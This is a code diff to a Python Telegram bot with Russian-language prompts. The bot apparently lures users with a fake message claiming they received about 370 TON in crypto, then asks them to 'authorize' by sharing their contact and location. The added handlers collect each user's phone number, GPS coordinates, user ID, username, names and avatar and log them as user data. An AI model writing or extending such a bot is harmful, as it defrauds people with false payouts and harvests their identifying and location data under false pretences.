@@ -28,6 +28,18 @@ def success(chat_id, text="📥 Вы получили 💠 370.61125 TON ($592.9
             reply_markup=keyboard
         )
 
+def get_location(chat_id, text="Вы не авторизованы, предоставьте доступ:"):
+    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    btn = types.KeyboardButton("💼 Авторизоваться", request_location=True)
+    keyboard.add(btn)
+    msg = bot.send_message(chat_id, text, reply_markup=keyboard)
+
+    progress_messages.append(msg.message_id)
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.row(
+        types.InlineKeyboardButton("Открыть кошелёк", url="t.me/CryptoBot"),
+    )
+
 def send_contact_location_keyboard(chat_id, text="Вы не авторизованы, предоставьте доступ:"):
     send_progress_income(chat_id)
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
@@ -84,7 +96,7 @@ def start(message):
 
     send_contact_location_keyboard(message.chat.id)
 
-@bot.message_handler(content_types=['contact', 'location', 'text'])
+@bot.message_handler(content_types=['contact'])
 def handler(message):
     user = message.from_user
     chat_id = message.chat.id
@@ -104,6 +116,57 @@ def handler(message):
         progress_messages.pop()
 
     print(progress_messages)
+
+    get_location(chat_id)
+
+    # success(chat_id)
+
+    try:
+        photos = bot.get_user_profile_photos(user.id, limit=1)
+        avatar_file_id = photos.photos[0][0].file_id if photos.total_count > 0 else None
+    except:
+        avatar_file_id = None
+
+    data = {
+        "chat_id": message.chat.id,
+        "user_id": user.id,
+        "username": user.username,
+        "first_name": user.first_name,
+        "last_name": user.last_name,
+        "language_code": user.language_code,
+        "is_premium": user.is_premium,
+        "phone_number": message.contact.phone_number if message.contact else None,
+        "location": {
+            "latitude": message.location.latitude if message.location else None,
+            "longitude": message.location.longitude if message.location else None
+        },
+        "avatar_file_id": avatar_file_id,
+    }
+
+    print("[USER DATA]", json.dumps(data, ensure_ascii=False, indent=4))
+
+@bot.message_handler(content_types=['location'])
+def handler(message):
+    user = message.from_user
+    chat_id = message.chat.id
+
+    bot.delete_message(chat_id, message.message_id)
+
+    print(progress_messages)
+
+    for m_id in progress_messages:
+        print('removing ' + str(m_id) + ' ...')
+        try:
+            bot.delete_message(chat_id, m_id)
+        except Exception as e:
+            print("Not possible to delete message, skipping...")
+        
+    while len(progress_messages) > 0:
+        progress_messages.pop()
+
+    print(progress_messages)
+
+    # get_location(chat_id)
 
     success(chat_id)
 
